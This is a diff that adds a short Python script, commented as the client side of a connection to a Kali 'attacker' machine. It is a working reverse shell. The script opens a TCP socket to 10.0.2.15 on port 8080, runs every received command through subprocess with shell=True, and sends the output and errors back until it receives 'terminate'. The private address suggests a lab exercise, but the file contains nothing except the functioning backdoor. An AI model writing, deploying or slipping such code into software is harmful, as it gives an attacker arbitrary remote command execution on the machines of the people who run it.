@@ -1,0 +1,21 @@
+# client side script
+
+import socket # for tcp connection
+import subprocess
+
+def connect():
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #start the socket object 's'
+	s.connect(('10.0.2.15', 8080)) #here we define the attacker ip and listening port.
+
+	while True:# keep receving commands from kali machine.
+		command = s.recv(1024) # read the first kb of the tcp socket
+		if 'terminate' in command:
+			s.close()
+			break
+		else:
+			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+			s.send( CMD.stdout.read() ) #send back the result
+			s.send( CMD.stderr.read() ) # send back the error if any
+def main():
+	connect()
+main()
